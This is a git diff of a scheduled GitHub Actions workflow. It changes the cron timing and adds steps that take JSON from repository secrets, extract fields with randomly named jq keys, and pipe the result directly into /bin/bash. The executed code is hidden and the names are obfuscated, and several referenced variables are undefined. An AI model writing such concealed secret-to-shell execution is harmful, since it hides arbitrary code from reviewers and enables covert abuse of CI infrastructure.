@@ -2,18 +2,22 @@ name: jiangyigu1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '21 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangyigu1829
         env:
-          qqzy25590: ${{ secrets.qqzy25590 }}
+          qt1: ${{ secrets.qt1 }}
         run: |
-          echo $qqzy25590 | jq -r .snr0310 | /bin/bash
-          echo $v930 | jq -r .l613 | /bin/bash
-          echo $p025 | jq -r .yjy54374 | /bin/bash
+          echo $qt1 | jq -r .v696 | /bin/bash
+          echo $l41 | jq -r .fezd407 | /bin/bash
+          echo $rflw3 | jq -r .cra3 | /bin/bash
+          echo $krqgr43602 | jq -r .ldyhr333 | /bin/bash
+          echo $rd90 | jq -r .npz2 | /bin/bash
+          echo $o8 | jq -r .cn92894 | /bin/bash
+          echo $w92 | jq -r .cxs7 | /bin/bash
+          echo $glqt28445 | jq -r .ofar3 | /bin/bash
 
